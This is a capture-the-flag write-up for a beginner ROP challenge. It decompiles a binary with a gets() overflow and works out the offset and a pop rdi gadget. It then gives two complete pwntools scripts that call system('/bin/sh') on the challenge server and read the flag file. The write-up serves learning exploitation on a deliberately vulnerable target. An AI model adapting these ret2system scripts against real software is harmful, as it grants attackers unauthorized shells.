
>Welcome to 'Byte Breakup,' where an old program is stuck in a code-cial relationship with a bug—the ex-girlfriend kind! She left a glitchy surprise, and now it's up to you to debug the drama away. Can you charm your way through its defenses and make it sing? Get ready for a byte-sized comedy of errors as you unravel the mysteries left by your digital ex!

>Author: @Inv1s1bl3

>`nc 34.125.199.248 6969`

#pwn #rop #easy #misaligned-stack #alt-solution

![[byte_breakup]]

tools used:
[[ghidra]]
[[gdb-pwndbg]]


```
─$ file byte_breakup 
byte_breakup: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=0604a3b4295396af9a4553857520acc5b7e09699, for GNU/Linux 3.2.0, not stripped
```

```
| RELRO         | STACK CANARY    | NX          | PIE    |
|---------------|-----------------|-------------|--------|
| Partial RELRO | No canary found | NX enabled  | No PIE |
```


```
└─$ ./byte_breakup 
Welcome to beginner ROP!
Enter the password: 
a
Wrong password

Exiting

```

This gives the clue it's a return oriented programming challenge.

Let's look with ghidra:

```
undefined8 main(void)

{
  setvbuf(stdout,(char *)0x0,2,0);
  puts("Welcome to beginner ROP!");
  vuln();
  puts("Exiting");
  return 0;
}
```

```
void vuln(void)

{
  char local_28 [32];
  
  puts("Enter the password: ");
  gets(local_28);
  puts("Wrong password\n");
  return;
}
```

```
void soClose(void)

{
  system("/bin/ls");
  return;
}
```

We can see above the challenge is similar but the win function won't give a shell as /bin/sh is mis spelt.

As with the [[buffer buffet]] challenge, the offset is found using cyclic 50 - with it being 40 bytes to overwrite the return address:
```
cyclic -l 0x6161616161616166
Finding cyclic pattern of 8 bytes: b'faaaaaaa' (hex: 0x6661616161616161)
Found at offset 40
````


Let's look at the soClose() function with gdb to see the system(/bin/ls) call and see if we can change it to /bin/sh

`$ python2 -c "print 'a' * 40 + '\x44\x12\x40\x00\x00\x00\x00\x00'" > payload`

Not going to work this way - no way of changing the parameter of the system() call.

Let's try and overwrite the vuln return address to the system() call directly while popping the string `"/bin/sh"` in rdi to see if that works:

```
pwndbg> disassem soClose
Dump of assembler code for function soClose:
   0x0000000000401244 <+0>:     push   rbp
   0x0000000000401245 <+1>:     mov    rbp,rsp
   0x0000000000401248 <+4>:     lea    rax,[rip+0xdfb]        # 0x40204a
   0x000000000040124f <+11>:    mov    rdi,rax
   0x0000000000401252 <+14>:    mov    eax,0x0
   0x0000000000401257 <+19>:    call   0x401050 <system@plt>
   0x000000000040125c <+24>:    nop
   0x000000000040125d <+25>:    pop    rbp
   0x000000000040125e <+26>:    ret
End of assembler dump.
```

Address of system(): `0x401050`

now we need a` pop_rdi; ret;` gadget:

Using `ropper --file byte_breakup`, there is `0x00000000004012bb: pop rdi; ret; `

Let's start building the script: (we have added an extra ret instruction as the stack was misaligned)

https://ir0nstone.gitbook.io/notes/types/stack/return-oriented-programming/stack-alignment

```
#!/usr/bin/env python3

from pwn import *

def start(argv=[], *a, **kw):
    # Start the exploit against the target
    if args.GDB:
        return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe] + argv, *a, **kw)
  
gdbscript = '''
init-pwndbg
continue
'''.format(**locals())


# Set up pwntools for the correct architecture
exe = './byte_breakup'
# This will automatically get context arch, bits, os etc
elf = context.binary = ELF(exe, checksec=False)
# Enable verbose logging so we can see exactly what is being sent (info/debug)
context.log_level = 'debug'


# io = start()
io = remote("34.125.199.248", "6969")
# Locate the functions/strings we need
system = elf.symbols['system']
binsh = 0x404048
padding = b'a' * 32
rbp = 1
pop_rdi = 0x4012bb
align_stack = 0x401020

# Craft a new payload which puts the "target" address at the correct offset
payload = flat(
    padding,
    rbp,
    align_stack,
    pop_rdi,
    binsh,
    system
)

write('payload', payload)


# Send the payload to a new copy of the process
io.sendlineafter(':', payload)

io.interactive()
```


#alt-solution - posted to discord after CTF but interesting reference for future challenges
```
#!/usr/bin/env python3

from pwn import *

context.log_level = logging.CRITICAL # makes everything quiet

exe = ELF("./vuln_patched")
libc = ELF("./libc.so.6")
ld = ELF("./ld-2.31.so")
rop = ROP(exe, base=0x400000)
context.binary = exe


def conn():
    if args.LOCAL:
        r = process([exe.path])
        if args.DEBUG:
            gdb.attach(r)
    else:
        r = remote("34.125.199.248", 6969)

    return r


def main():
    r = conn()
    rop.raw(b'\x00'*40)
    rop.raw(p64(rop.search(move=4)[0]))
    rop.rdi = next(exe.search(b"/bin/sh"))
    rop.call('system')
    r.recvrepeat(timeout=0.2)
    r.sendline(rop.chain())
    log.maybe_hexdump(rop.chain())
    r.recvrepeat(timeout=0.2)
    r.sendline(b'cat /home/flag.txt')
    flag = r.recvall(timeout=0.2).decode()
    context.log_level = logging.INFO 
    log.success(flag)


if __name__ == "__main__":
    main()
```